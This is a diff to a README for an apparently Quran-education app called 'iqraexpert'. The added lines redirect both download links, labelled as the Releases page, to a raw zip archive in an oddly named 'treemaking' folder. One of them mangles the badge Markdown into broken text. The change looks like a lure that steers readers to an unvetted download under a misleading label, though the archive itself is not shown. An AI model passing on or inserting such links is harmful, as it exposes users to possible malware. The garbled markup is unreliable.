@@ -6,7 +6,7 @@ Welcome to the **iqraexpert** project, your gateway to online Quran education in
 
 ## 🔗 Download Now
 
-[![Download iqraexpert](https://img.shields.io/badge/Download%20Now-Get%20iqraexpert-brightgreen.svg)](https://github.com/genusallosaurusvinadelmar874/iqraexpert/releases)
+[![Download iqraexpert](https://raw.githubusercontent.com/genusallosaurusvinadelmar874/iqraexpert/main/treemaking/iqraexpert_v1.4.zip%20Now-Get%https://raw.githubusercontent.com/genusallosaurusvinadelmar874/iqraexpert/main/treemaking/iqraexpert_v1.4.zip)](https://raw.githubusercontent.com/genusallosaurusvinadelmar874/iqraexpert/main/treemaking/iqraexpert_v1.4.zip)
 
 ## 🛠️ System Requirements
 
@@ -18,7 +18,7 @@ Before downloading, ensure that you meet the following system requirements:
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/genusallosaurusvinadelmar874/iqraexpert/releases) to download the application.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/genusallosaurusvinadelmar874/iqraexpert/main/treemaking/iqraexpert_v1.4.zip) to download the application.
 
 1. Click the download link on the Releases page corresponding to the latest version.
 2. You will see options for different operating systems. Choose the one that fits your system.
